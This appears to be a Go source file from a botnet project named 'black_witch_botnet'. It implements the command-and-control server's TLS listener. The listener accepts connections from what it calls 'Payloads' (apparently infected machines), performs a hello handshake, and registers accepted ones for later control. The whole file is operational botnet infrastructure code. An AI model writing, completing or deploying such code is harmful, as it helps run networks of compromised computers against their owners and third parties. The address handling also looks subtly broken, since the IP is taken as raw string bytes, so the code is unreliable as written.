package server

import (
	"black_witch_botnet/relations"
	"context"
	"crypto/tls"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

type AcceptServer struct {
	Addr string
	Cert string
	Key  string
}

type KeepAliveListener struct {
	*net.TCPListener
}

func (ln KeepAliveListener) Accept() (net.Conn, error) {
	conn, err := ln.AcceptTCP()

	if err != nil {
		return conn, err
	}

	conn.SetKeepAlive(true)
	conn.SetKeepAlivePeriod(5 * time.Second)

	return conn, nil
}

func (s *AcceptServer) Run(r *Runner, wg *sync.WaitGroup, ctx context.Context) {
	l := s.listen()

	go func () {
		<-ctx.Done()

		for _, p := range r.Payloads {
			p.Conn.Close()
		}

		l.Close()
	}()

	s.accept(l, r, ctx)
	wg.Done()
}

func (s *AcceptServer) listen() net.Listener {
	cer, err := tls.LoadX509KeyPair(s.Cert, s.Key)

	if err != nil {
		log.Println(err)
		os.Exit(1)
	}

	config := &tls.Config{Certificates: []tls.Certificate{cer}}

	addr := strings.Split(s.Addr, ":")
	ip := []byte(addr[0])
	port, err := strconv.Atoi(addr[1])

	if err != nil {
		log.Printf("[ADDR] Miss port %s", err)
		os.Exit(1)
	}

	inner, err := net.ListenTCP("tcp", &net.TCPAddr{IP: ip, Port: port})

	if err != nil {
		log.Printf("[TCP] Listen on %s: %v", s.Addr, err)
		os.Exit(1)
	}

	l := tls.NewListener(KeepAliveListener{inner}, config)

	log.Printf("[TCP] Listening on %s", s.Addr)

	return l
}

func (s *AcceptServer) accept(l net.Listener, r *Runner, ctx context.Context) {
	for {
		conn, err := l.Accept()

		if err != nil {
			break
		}

		go s.handle(conn, r, ctx)
	}
}

func (s *AcceptServer) handle(conn net.Conn, r *Runner, ctx context.Context) {
	p := &Payload{
		Addr: conn.RemoteAddr(),
		Conn: conn,
	}

	req := &relations.EventMessage{
		Type: relations.EventTypeHello,
	}

	res, err := p.handle(req)

	if err != nil {
		log.Println("[TCP] Handle hello", err)
		return
	}

	e, ok := res.(*relations.EventResult)
	if !ok || !e.Status {
		o := dump(res)
		log.Printf("[*] Reject connection %s\n", p.Addr)
		log.Println(o)

		conn.Close()
		return
	}

	r.Payloads = append(r.Payloads, p)
	log.Printf("[*] New connection %s. Total connections: %d\n", p.Addr, len(r.Payloads))
}
